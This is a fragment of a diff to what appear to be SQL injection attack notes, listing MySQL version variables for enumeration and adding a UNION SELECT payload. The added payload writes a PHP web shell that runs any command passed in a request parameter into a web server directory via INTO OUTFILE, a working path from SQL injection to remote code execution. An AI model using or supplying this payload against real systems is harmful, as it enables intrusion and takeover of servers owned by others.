@@ -35,3 +35,10 @@ Step 2  ==================== enumration ==================================
 additionals 
 
 @@version_compile_os, @@version_compile_machine
+
+
+
+
+UDF 
+
+’ union select “<? system($_REQUEST[‘cmd’]); ?>”,2,3 INTO OUTFILE ‘/var/www/test/execcmd.php’#
